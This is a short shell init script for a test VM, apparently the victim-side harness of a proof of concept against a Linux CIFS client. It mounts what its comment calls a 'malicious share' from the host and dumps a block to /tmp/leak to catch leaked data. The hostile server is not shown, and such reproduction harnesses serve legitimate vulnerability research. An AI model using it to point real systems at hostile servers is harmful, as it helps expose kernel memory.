#!/bin/sh
# Guest-side init script (place inside the initrd as /init).
# Brings up loopback + eth0, mounts the malicious share, attempts a read.
/bin/busybox --install -s
mount -t proc proc /proc
mount -t sysfs sys /sys
ifconfig lo up
ifconfig eth0 10.0.2.15 up
route add default gw 10.0.2.2

echo "[init] mounting //10.0.2.2/SHARE ..."
mount.cifs //10.0.2.2/SHARE /mnt \
    -o sec=ntlmssp,vers=2.0,user=guest,password=,rsize=65536,port=1445
echo "[init] read attempt:"
dd if=/mnt/file of=/tmp/leak bs=4096 count=1
echo "[init] done"
sync
poweroff -f
